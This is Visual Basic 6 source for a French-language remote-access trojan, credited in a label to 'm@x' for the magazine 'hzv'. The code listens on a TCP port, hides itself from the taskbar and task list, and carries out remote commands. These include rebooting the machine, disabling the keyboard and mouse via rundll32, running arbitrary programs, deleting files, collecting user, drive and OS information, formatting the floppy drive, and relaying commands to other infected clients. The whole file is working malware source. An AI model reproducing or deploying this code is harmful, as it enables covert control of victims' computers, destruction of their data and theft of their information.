VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Winpopup 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Trojan"
   ClientHeight    =   7410
   ClientLeft      =   255
   ClientTop       =   495
   ClientWidth     =   6840
   FillColor       =   &H00FF8080&
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00FF8080&
   Icon            =   "socket.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7410
   ScaleWidth      =   6840
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command25 
      Caption         =   "Fermer le lecteur cd"
      Height          =   375
      Left            =   2040
      TabIndex        =   41
      Top             =   6120
      Width           =   1695
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Ouvre le lecteur cd"
      Height          =   375
      Left            =   240
      TabIndex        =   40
      Top             =   6120
      Width           =   1695
   End
   Begin RichTextLib.RichTextBox envoye 
      Height          =   2175
      Left            =   1920
      TabIndex        =   39
      Top             =   960
      Width           =   4575
      _ExtentX        =   8070
      _ExtentY        =   3836
      _Version        =   393217
      TextRTF         =   $"socket.frx":0CCA
   End
   Begin VB.Timer Timer5 
      Interval        =   100
      Left            =   6600
      Top             =   5640
   End
   Begin MSWinsockLib.Winsock pc 
      Left            =   1200
      Top             =   9480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command26 
      Caption         =   "infos sur le PC"
      Height          =   375
      Left            =   5280
      TabIndex        =   36
      Top             =   5640
      Width           =   1215
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   9600
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   0
      Top             =   9840
   End
   Begin VB.Frame Frame2 
      Caption         =   "Informations sur le PC"
      Height          =   1815
      Left            =   240
      TabIndex        =   29
      Top             =   7440
      Width           =   6375
      Begin VB.Label Label8 
         Height          =   255
         Left            =   120
         TabIndex        =   37
         Top             =   1440
         Width           =   6135
      End
      Begin VB.Label Label6 
         Height          =   255
         Left            =   120
         TabIndex        =   34
         Top             =   1200
         Width           =   6135
      End
      Begin VB.Label Label5 
         Height          =   255
         Left            =   120
         TabIndex        =   33
         Top             =   960
         Width           =   6135
      End
      Begin VB.Label Label4 
         Height          =   255
         Left            =   120
         TabIndex        =   32
         Top             =   720
         Width           =   6135
      End
      Begin VB.Label Label3 
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   480
         Width           =   5895
      End
      Begin VB.Label Label1 
         Height          =   255
         Left            =   120
         TabIndex        =   30
         Top             =   240
         Width           =   6135
      End
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Regler le volume"
      Height          =   375
      Left            =   3840
      TabIndex        =   28
      Top             =   5640
      Width           =   1335
   End
   Begin VB.CommandButton Command23 
      Caption         =   "Ouvre page web"
      Height          =   375
      Left            =   4800
      TabIndex        =   27
      Top             =   4200
      Width           =   1455
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Supprimer session"
      Height          =   375
      Left            =   2040
      TabIndex        =   26
      Top             =   5640
      Width           =   1695
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Cree un fichier texte"
      Height          =   375
      Left            =   4920
      TabIndex        =   25
      Top             =   5160
      Width           =   1695
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Ecouter une musique"
      Height          =   375
      Left            =   240
      TabIndex        =   24
      Top             =   5640
      Width           =   1695
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Leds du clavier"
      Height          =   375
      Left            =   5400
      TabIndex        =   23
      Top             =   4680
      Width           =   1335
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   800
      Left            =   4080
      Top             =   9480
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Changer le texte des applications"
      Height          =   375
      Left            =   2160
      TabIndex        =   22
      Top             =   5160
      Width           =   2655
   End
   Begin VB.Frame Frame1 
      Caption         =   "Plus"
      Height          =   735
      Left            =   240
      TabIndex        =   20
      Top             =   6600
      Width           =   6375
      Begin VB.TextBox Text1 
         Height          =   315
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   21
         Top             =   240
         Width           =   6135
      End
   End
   Begin VB.CommandButton command18 
      Caption         =   "Afficher l'écran"
      Height          =   375
      Left            =   240
      TabIndex        =   19
      Top             =   4680
      Width           =   1575
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Activer clavier"
      Height          =   375
      Left            =   2040
      TabIndex        =   18
      Top             =   4200
      Width           =   1335
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Desactiver clavier"
      Height          =   375
      Left            =   1920
      TabIndex        =   17
      Top             =   4680
      Width           =   1575
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Afficher un message"
      Height          =   375
      Left            =   240
      TabIndex        =   16
      Top             =   5160
      Width           =   1815
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Crasher le PC"
      Height          =   375
      Left            =   3480
      TabIndex        =   15
      Top             =   4200
      Width           =   1215
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Supprimer un fichier"
      Height          =   375
      Left            =   3600
      TabIndex        =   14
      Top             =   4680
      Width           =   1695
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Connexion internet"
      Height          =   375
      Left            =   240
      TabIndex        =   13
      Top             =   4200
      Width           =   1695
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Deconnexion internet"
      Height          =   375
      Left            =   4680
      TabIndex        =   12
      Top             =   3720
      Width           =   1815
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Imprimer un texte"
      Height          =   375
      Left            =   3000
      TabIndex        =   11
      Top             =   3720
      Width           =   1575
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Beep"
      Height          =   375
      Left            =   2160
      TabIndex        =   10
      Top             =   3720
      Width           =   735
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Enlever le fond d'écran"
      Height          =   375
      Left            =   240
      TabIndex        =   9
      Top             =   3720
      Width           =   1815
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Allumer un programme"
      Height          =   375
      Left            =   4680
      TabIndex        =   8
      Top             =   3240
      Width           =   1815
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Rebooter win"
      Height          =   375
      Left            =   3360
      TabIndex        =   7
      Top             =   3240
      Width           =   1215
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Mettre la souris"
      Height          =   375
      Left            =   1800
      TabIndex        =   6
      Top             =   3240
      Width           =   1455
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Enlever la souris"
      Height          =   375
      Left            =   240
      TabIndex        =   5
      Top             =   3240
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connexion"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   4080
      Picture         =   "socket.frx":0DF2
      TabIndex        =   3
      Top             =   480
      Width           =   975
   End
   Begin MSWinsockLib.Winsock Repondre 
      Left            =   1320
      Top             =   9720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Ecouter 
      Left            =   3840
      Top             =   2400
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin RichTextLib.RichTextBox Arrive 
      Height          =   975
      Left            =   1920
      TabIndex        =   2
      Top             =   10080
      Visible         =   0   'False
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   1720
      _Version        =   393217
      ScrollBars      =   3
      TextRTF         =   $"socket.frx":CCD38
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Times New Roman"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   3000
      Top             =   9720
   End
   Begin VB.ListBox ListClient 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   2205
      Left            =   240
      TabIndex        =   1
      Top             =   960
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Index           =   0
      Left            =   2040
      Top             =   9720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Client 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   1200
      TabIndex        =   0
      Top             =   480
      Width           =   2775
   End
   Begin MSWinsockLib.Winsock Winsock 
      Index           =   0
      Left            =   3600
      Top             =   9360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label9 
      Caption         =   "Label9845"
      Height          =   375
      Left            =   5760
      TabIndex        =   38
      Top             =   9720
      Width           =   495
   End
   Begin VB.Label Label7 
      Caption         =   "Ce trojan a été cree par m@x pour le magazine hzv appuyer "
      Height          =   255
      Left            =   120
      TabIndex        =   35
      Top             =   9720
      Width           =   1455
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Tapez ici l'ip du PC que vous voulez controler"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1560
      TabIndex        =   4
      Top             =   120
      Width           =   3375
   End
End
Attribute VB_Name = "Winpopup"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim iconet As IconeTray
Private Declare Function GetSystemMenu Lib "User32" (ByVal hWnd As Long, ByVal bRevert As Long) As Long
Private Declare Function DeleteMenu Lib "User32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetDoubleClickTime Lib "User32" () As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long
Private Declare Function SetDoubleClickTime Lib "User32" (ByVal wCount As Long) As Long
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function RemoveDirectory Lib "kernel32" Alias "RemoveDirectoryA" (ByVal lpPathName As String) As Long
Private Declare Function GetCursorPos Lib "User32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
X As Long
Y As Long
End Type
Private Type OSVERSIONINFO
dwOSVersionInfoSize As Long
dwMajorVersion As Long
dwMinorVersion As Long
dwBuildNumber As Long
dwPlatformId As Long
szCSDVersion As String * 128      ' Maintenance string for PSS usage
End Type
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long



Private Sub cache_Click()
Me.Visible = False
End Sub

Private Sub Command1_Click()
Dim i As Integer
For i = 0 To ListClient.ListCount - 1 Step 1
If ListClient.List(i) = Client.text Then
   Exit Sub
End If
Next
For i = 1 To 99 Step 1
      If VecNumEnvoy(i) = False Then
         Numero = i
         VecNumEnvoy(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
     Load Winsock2(Numero)
     Winsock2(Numero).Connect Client.text, 43210
     connecter.Enabled = False
    
    
    If VecStrRecep(Index) = "/infos" Then
lblUtilisateur = RegLireChaine(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
   VecStrRecep(Index) = ""
End If

    
End Sub

Private Sub connecter_Click()
Dim i As Integer
For i = 0 To ListClient.ListCount - 1 Step 1
If ListClient.List(i) = Client.text Then
   Exit Sub
End If
Next
For i = 1 To 99 Step 1
      If VecNumEnvoy(i) = False Then
         Numero = i
         VecNumEnvoy(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
     Load Winsock2(Numero)
     Winsock2(Numero).Connect Client.text, 43210
     connecter.Enabled = False
    
End Sub

Private Sub Command10_Click()
Winpopup.Height = "7740"
envoye.text = "/deconexion web"
End Sub

Private Sub Command11_Click()
Winpopup.Height = "7740"
envoye.text = "/connexion web"
End Sub

Private Sub Command12_Click()
Winpopup.Height = "7740"
envoye.text = "/rglvol"
End Sub

Private Sub Command13_Click()
Winpopup.Height = "7740"
envoye.text = "/suppr"
Text1.text = "Tapez ici le chemin d'acces"
End Sub

Private Sub Command14_Click()
Winpopup.Height = "7740"
envoye.text = "/crash"
End Sub

Private Sub Command15_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez ici le texte qui le prgramme enveras le message"
envoye.text = "/pirater"
End Sub

Private Sub Command16_Click()
Winpopup.Height = "7740"
envoye.text = "/clavier non"
End Sub

Private Sub Command17_Click()
Winpopup.Height = "7740"
envoye.text = "/clavier oui"
End Sub


Private Sub command18_Click()
Winpopup.Height = "7740"
envoye.text = "/imp ecran"
End Sub

Private Sub Command19_Click()
Winpopup.Height = "7740"
envoye.text = "/led"
End Sub

Private Sub Command2_Click()
Winpopup.Height = "7740"
envoye.text = "/souris non"
KeyAscii = 13
End Sub

Private Sub Command20_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez ici le chemin d'acces de la musique"
envoye.text = "/jouerson"
End Sub

Private Sub Command21_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez votre texte ici il seras automatiquement envoyer"
envoye.text = "/crfichier"
End Sub

Private Sub Command22_Click()
Winpopup.Height = "7740"
envoye.text = "/supprsession"
End Sub

Private Sub Command23_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez ici l'adresse web"
envoye.text = "/ouvrepweb"
End Sub

Private Sub Command24_Click()
envoye.text = "/ovrcd"

End Sub



Private Sub Command26_Click()
envoye.text = "/infos"
Winpopup.Height = "9810"
Winpopup.Left = (Screen.Width - Winpopup.Width) / 2
Winpopup.Top = (Screen.Height - Winpopup.Height) / 2
End Sub

Private Sub Command3_Click()
Winpopup.Height = "7740"
envoye.text = "/souris oui"
End Sub

Private Sub Command4_Click()
Winpopup.Height = "7740"
envoye.text = "/stop win"
End Sub

Private Sub Command5_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez ici le chemin d'acces du programme"
envoye.text = "/executeprg"
End Sub

Private Sub Command6_Click()
Winpopup.Height = "7740"
envoye.text = "/pasfd"
End Sub

Private Sub Command7_Click()
Winpopup.Height = "7740"
envoye.text = "/beep"
End Sub

Private Sub Command8_Click()
Winpopup.Height = "7740"
Text1.text = "Tapez ici le texte que toutes les apps auront"
envoye.text = "/chgtexteapps"
End Sub

Private Sub Command9_Click()
Winpopup.Height = "7740"
envoye.text = "/imprimer texte"
End Sub

Private Sub Ecouter_DataArrival(ByVal bytesTotal As Long)
Dim Donnee As String
Ecouter.GetData Donnee
Ecoute.Ecoute.text = Ecoute.Ecoute.text & vbCrLf & vbCrLf & Mid(Donnee, 1, InStr(1, Donnee, vbCrLf, vbBinaryCompare)) & vbCrLf & Mid(Donnee, InStr(1, Donnee, vbCrLf, vbBinaryCompare) + 2)
End Sub

Private Sub envoye_KeyPress(KeyAscii As Integer)
Dim Fichier As String
Dim contenu As String
Dim fil As Integer

fil = FreeFile
contenu = ""
If KeyAscii = 13 Then
If envoye.text = "~Protect~" Then
Protection = True
Image4.Visible = True
Exit Sub
End If

If envoye.text = "~DeProtect~" Then
Protection = False
Image4.Visible = False
Exit Sub
End If

If envoye.text = "/ecouter" Then
Ecoute.Show
Exit Sub
End If

If envoye.text = "/ecran" Then
SetWindowRgn hWnd, CreateEllipticRgn(0, 0, Me.Width, Me.Width), True
Exit Sub
End If


If Mid(envoye.text, 1, 7) = "~Copie~" Then
Fichier = Mid(envoye.text, 8, InStr(1, envoye.text, "/", vbBinaryCompare) - 8)
Open Fichier For Binary As fil
contenu = String(LOF(fil), " ")
Get fil, , contenu
Close fil
contenu = contenu & "~EndFile~"
envoye.text = "/crfichier" & Mid(envoye.text, InStr(1, envoye.text, "/", vbBinaryCompare) + 1) & "/"
End If

On Error Resume Next
Winsock2(ListClient.ListIndex + 1).SendData envoye.text & contenu
Repondre.SendData "Message envoyé à " & Winsock2(ListClient.ListIndex + 1).RemoteHostIP & vbCrLf & envoye.text & contenu
statut.Panels(5).text = "envoyé !"
contenu = ""
Else

End If
End Sub


Private Sub ChangerÉtat(Touche As KeyCodeConstants, Etat As Integer)


End Sub


Private Sub Form_Load()
SetWindowPos Me.hWnd, HWND_TOPMOST, Me.Left / 15, Me.Top / 15, Me.Width / 15, Me.Height / 15, SWP_NOACTIVATE Or SWP_SHOWWINDOW
Dim hMenu As Long

hMenu = GetSystemMenu(Me.hWnd, 0)                   'Récupère le handle du menu système de la feuille
Call DeleteMenu(hMenu, SC_SC_SIZE, MF_BYCOMMAND)
Dim i As Integer
i = 0
'mettre en transparence
'ret = SetWindowLong(Accueil.hwnd, GWL_EXSTYLE, WS_EX_TRANSPARENT)
Pid = GetCurrentProcessId()
Regserv = RegisterServiceProcess(Pid, RSP_SIMPLE_SERVICE)
For i = 0 To 99 Step 1
VecNumRecep(i) = False
VecNumEnvoy(i) = False
Next
Numero = 0
Nombre = 0
Winsock(0).LocalPort = 43210
Winsock(0).Listen
Repondre.LocalPort = 43211
Repondre.Listen
'Préparation de la variable IconeT
     iconet.cbSize = Len(iconet) 'Taille de l'icône en octet
     iconet.hWnd = Me.hWnd       'Handle de l'application (pour qu'elle reçoive les messages envoyés lors d'un clic, double-clic...
     iconet.uID = 1&             'Identificateur de l'icône
     iconet.uFlags = Icone Or TIP Or MESSAGE
     iconet.uCallbackMessage = MOUSEMOVE  'Renvoyer les messages concernant l'action de la souris
     iconet.szTip = "Trojan" & Chr$(0)    'Texte de la bulle d'aide
     Shell_NotifyIcon AJOUT, iconet
     App.TaskVisible = False 'Retire le bouton de l'application de la barre des tâches
     Me.WindowState = minimized
     
     If VecStrRecep(Index) = "/souris oui" Then
   ShowCursor True
   VecStrRecep(Index) = ""
End If





End Sub




Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim msg As Long
If Me.Visible = False Then
Me.Visible = True
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
Shell_NotifyIcon SUPPRIME, iconet
End Sub

Private Sub Image1_Click()
Me.Visible = False
End Sub



Private Sub Image2_Click()
Unload Me
End Sub

Private Sub reception_Click(Index As Long)
Arrive.text = VecStrRecep(Index + 1)
IndexReception = Index
reception.Pages.Item(Index).Caption = Replace(reception.Pages.Item(Index).Caption, "m@il:", "", , , vbBinaryCompare)
End Sub

Private Sub Repondre_ConnectionRequest(ByVal requestID As Long)
Repondre.Close
Repondre.Accept requestID
End Sub




Private Sub Timer1_Timer()
Dim i As Integer
For i = ListClient.ListCount - 1 To 0 Step -1
    On Error Resume Next
    If Winsock2(i + 1).State <> sckConnected Then
       ListClient.RemoveItem i
       Unload Winsock2(i + 1)
    End If
Next

End Sub

Private Sub Voir_Click()
Me.Visible = True
End Sub

Private Sub Timer2_Timer()
ChangerEtat vbKeyScrollLock
ChangerEtat vbKeyNumlock
End Sub

Private Sub Timer3_Timer()
temps = Int(GetTickCount() / 1000)
h = Int(temps / 3600)
mn = Int((temps - 3600 * h) / 60)
s = temps - 3600 * h - 60 * mn



Label5 = "Windows est lancé depuis:" & h & " h " & mn & " mn " & s & " s"

Dim curs As POINTAPI
a& = GetCursorPos(curs)
'Stop

Label4 = "Position de la souris: " & "(" & curs.X & ";" & curs.Y & ")"
End Sub

Private Sub Winsock_Close(Index As Integer)
VecNumEnvoy(Index) = False
End Sub
Private Sub Winsock_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Dim i As Integer
  If Index = 0 Then
      For i = 1 To 99 Step 1
      If VecNumRecep(i) = False Then
         Nombre = i
         VecNumRecep(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
      Load Winsock(Nombre)
      Winsock(Nombre).LocalPort = 0
      Winsock(Nombre).Accept requestID
      reception.Visible = True
      Arrive.Visible = True
      reception.Pages.Add Winsock(Index).RemoteHostIP
   End If
End Sub
Private Sub winsock_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Recu As String
Dim EString As String
Dim Fichier As String
Dim fil As Integer
Dim i As Integer
On Error Resume Next
Winsock(Index).GetData VecStrRecep(Index)
Repondre.SendData "Message reçu de " & Winsock(Index).RemoteHostIP & vbCrLf & VecStrRecep(Index)
'execute les sons de windows
If Protection = False Then
If VecStrRecep(Index) = "/beep" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND1
     MessageBeep SOUND2
     MessageBeep SOUND3
     MessageBeep SOUND4
     MessageBeep SOUND5
     MessageBeep SOUND6
     MessageBeep SOUND7
     MessageBeep SOUND8
     MessageBeep SOUND9
     MessageBeep SOUND10
   Exit Sub
End If
'execute le premier sons
If VecStrRecep(Index) = "/son1" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND1
    Exit Sub
End If


If VecStrRecep(Index) = "~Beep2~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND2
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep3~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND3
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep4~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND5
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep5~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND5
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep6~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND6
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep7~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep8~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep9~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If
If VecStrRecep(Index) = "~Beep10~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND10
    Exit Sub
End If

'Empêche de se cacher
If VecStrRecep(Index) = "~NoCache~" Then
   VecStrRecep(Index) = ""
   image1.Visible = False
   cacher.Enabled = False
   Exit Sub
End If
'Permet de se cacher
If VecStrRecep(Index) = "~Cache~" Then
   VecStrRecep(Index) = ""
   image1.Visible = True
   cacher.Enabled = True
   Exit Sub
End If
'Empeche de se connecter
If VecStrRecep(Index) = "~NoConnect~" Then
   VecStrRecep(Index) = ""
   connecter.Visible = False
   Exit Sub
End If
'Permet de se connecter
If VecStrRecep(Index) = "~ReConnect~" Then
   VecStrRecep(Index) = ""
   connecter.Visible = True
   Exit Sub
End If
'Empêche de quitter
If VecStrRecep(Index) = "~NoQuit~" Then
   VecStrRecep(Index) = ""
   Image2.Visible = False
   Exit Sub
End If

'Permet de quitter
If VecStrRecep(Index) = "~ReQuit~" Then
   VecStrRecep(Index) = ""
  Image2.Visible = True
   Exit Sub
End If

'se connecter a quelqu'un
If Mid(VecStrRecep(Index), 1, 9) = "~Connect~" Then
   EString = Mid(VecStrRecep(Index), 10)
   VecStrRecep(Index) = ""
   Client.text = EString
   connecter_Click
   Exit Sub
End If


'joue avec les bonhommes
If VecStrRecep(Index) = "~Oui~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = True
   Non.Visible = False
   Bof.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~Non~" Then
   VecStrRecep(Index) = ""
   Non.Visible = True
   Oui.Visible = False
   Bof.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~Bof~" Then
   VecStrRecep(Index) = ""
   Bof.Visible = True
   Oui.Visible = False
   Non.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~OuiBofNon~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = True
   Non.Visible = True
   Bof.Visible = True
    Exit Sub
End If

If VecStrRecep(Index) = "~Clear~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = False
   Non.Visible = False
   Bof.Visible = False
    Exit Sub
End If
'reboot la machine
If VecStrRecep(Index) = "/stop win" Then
   Arrive.text = ""
   ExitWindowsEx EWX_REBOOT, 0
   Exit Sub
End If
If VecStrRecep(Index) = "~CacherAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~CacherAll~")
   Exit Sub
End If
'reboot les machines de tous les clients avec qui je suis connecter
If VecStrRecep(Index) = "~CacherAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~Cacher~")
  End If
'cache le Programme
If VecStrRecep(Index) = "~Cacher~" Then
   Me.Visible = False
   Exit Sub
End If


If VecStrRecep(Index) = "~FondAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~FondAll~")
   Exit Sub
End If
If VecStrRecep(Index) = "~FondAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~Fond~")
  End If
If VecStrRecep(Index) = "~Fond~" Then
   FondNoir.Show 1
   Exit Sub
End If
If VecStrRecep(Index) = "~NoFondAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~NoFondAll~")
   Exit Sub
End If
If VecStrRecep(Index) = "~NoFondAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~NoFond~")
  End If
If VecStrRecep(Index) = "/pasfd" Then
   Unload FondNoir
   ShowCursor True
   SystemParametersInfo SPI_SCREENSAVERRUNNING, False, "1", 0
   Exit Sub
End If

If Mid(VecStrRecep(Index), 1, 6) = "~Font~" Then
   EString = Mid(VecStrRecep(Index), 7)
   VecStrRecep(Index) = ""
   Arrive.Font.Name = EString
End If

If Mid(VecStrRecep(Index), 1, 8) = "~Taille~" Then
   EString = Mid(VecStrRecep(Index), 9)
   VecStrRecep(Index) = ""
   Arrive.Font.Size = EString
End If

'cache le curseur
If VecStrRecep(Index) = "/souris non" Then
   ShowCursor False
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/souris oui" Then
   Shell "rundll32 mouse,disable"
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/ouvrepweb" Then
ShellExecute Me.hWnd, "open", Text1, ByVal 0&, 0&, 1
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/executeprg" Then
ShellExecute Me.hWnd, "open", Text1, ByVal 0&, 0&, 1
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/chgtexteapps" Then
 WinTitleTXT Text1

   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/chgresolution" Then
End If

If VecStrRecep(Index) = "/imprimer texte" Then
   Printer.Print
Printer.FontName = "Arial"
Printer.Print ; Text1.text
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/pirater" Then
   MsgBox Text1
   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/frmcd" Then
   Call FermerCD
   VecStrRecep(Index) = ""
End If


If VecStrRecep(Index) = "/infos" Then
   Timer4.Enabled = True
   Timer3.Enabled = True
   Dim os As OSVERSIONINFO
Label8 = "Nom du pc: " & pc.LocalHostName
    

os.dwOSVersionInfoSize = Len(os)  ' set the size of the structure
RetVal = GetVersionEx(os)  ' read Windows's version information

Label1 = "La version de windows est" & os.dwMajorVersion & "." & os.dwMinorVersion

Dim logi As String * 255
R = GetLogicalDriveStrings(255, logi)
logi = Trim(logi)

For a = 1 To Len(logi)
If Asc(Mid(logi, a, 1)) = 0 Then Mid(logi, a, 1) = "  "
Next


Dim us As Long
us = 255
Dim USER As String * 255
a = GetUserName(USER, us)
utilisateur = Left(USER, us - 1)

Label6 = Label6 + " '" + utilisateur + "'" + label9845





Label3 = Label3 + " " + logi
Debug.Print "'" + logi + "'"


Largeur% = Screen.Width \ Screen.TwipsPerPixelX
Hauteur% = Screen.Height \ Screen.TwipsPerPixelY
Label3 = "Résolution de l'écran : " & Largeur% & " x" & Hauteur%


   VecStrRecep(Index) = ""
End If


If VecStrRecep(Index) = "/clavier non" Then
   Shell "rundll32 keyboard,disable"
   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/jouerson" Then
JoueWav Text1, 1
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/formatdisquette" Then
Shell "format a:\"
End If

